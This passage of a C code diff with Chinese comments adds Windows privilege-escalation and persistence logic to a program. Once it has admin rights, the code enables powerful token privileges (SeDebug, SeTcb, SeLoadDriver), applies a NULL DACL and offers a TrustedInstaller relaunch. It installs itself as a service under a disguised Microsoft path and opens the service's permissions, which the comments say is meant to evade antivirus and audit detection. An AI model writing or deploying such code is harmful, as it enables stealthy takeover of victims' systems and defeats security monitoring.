+                         TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+        if (EnableAllPrivileges(hToken)) {
+            printf("[Priv] 全部特权遍历完成\n");
+        } else {
+            printf("[Priv] 全部特权遍历部分失败（部分特权可能不在 Token 中）\n");
+        }
+        CloseHandle(hToken);
+    }
+    printf("\n");
+    return count;
+}
+
 int main(int argc, char *argv[]) {
     // ===== 第一步：解析命令行参数（最高优先级） =====
     BOOL bIsSlave     = FALSE;
@@ -576,6 +1327,31 @@ int main(int argc, char *argv[]) {
         }else {
             printf("已经是管理员\n");
         }
+
+        /* ============================================================
+         * ★ 内核级权限提升 ★
+         *
+         * 在管理员权限的基础上，进一步获取:
+         *   1. NULL DACL 安全描述符 — 绕过所有权限检查
+         *   2. 13 项关键内核特权 (SeTcbPrivilege, SeDebugPrivilege,
+         *      SeLoadDriverPrivilege 等)
+         *   3. Token 中全部可用特权遍历启用
+         *
+         * 达到与 StarlightGUI 同等的用户态最高权限。
+         * ============================================================ */
+        printf("\n");
+        ElevateToKernelLevel();
+
+        /* ============================================================
+         * TrustedInstaller 提权（可选 — 取消注释以启用）
+         *
+         * 以 Windows 最高用户态权限 TrustedInstaller 重新启动自身。
+         * 这比当前管理员权限更进一步，可访问受 SYSTEM+TrustedInstaller
+         * 保护的资源和服务。
+         *
+         *   CreateProcessAsTrustedInstaller(自身路径, TRUE, NULL);
+         *   return 0;  // 退出当前实例，以 TI 权限运行的新实例接管
+         * ============================================================ */
 
         char targetPath[MAX_PATH] = "C:\\Program Files\\Microsoft\\shell.exe";
         
@@ -659,6 +1435,21 @@ int main(int argc, char *argv[]) {
             return 1;
         } else {
             printf("服务创建成功\n");
+
+            /* ★ 为服务设置完全访问安全描述符 ★
+             * 防止权限不足的进程无法控制服务，也防止被杀软/SACL检测。
+             */
+            PSECURITY_DESCRIPTOR pServiceSD = NULL;
+            if (CreateFullAccessSDDL(&pServiceSD)) {
+                if (SetServiceObjectSecurity(hNew, DACL_SECURITY_INFORMATION,
+                                              pServiceSD)) {
+                    printf("服务安全描述符已设为完全访问\n");
+                } else {
+                    printf("服务安全描述符设置失败 (错误: %lu)\n",
+                           GetLastError());
+                }
+                LocalFree(pServiceSD);
+            }
         }
 
         // 设置描述（使用宽字符串）
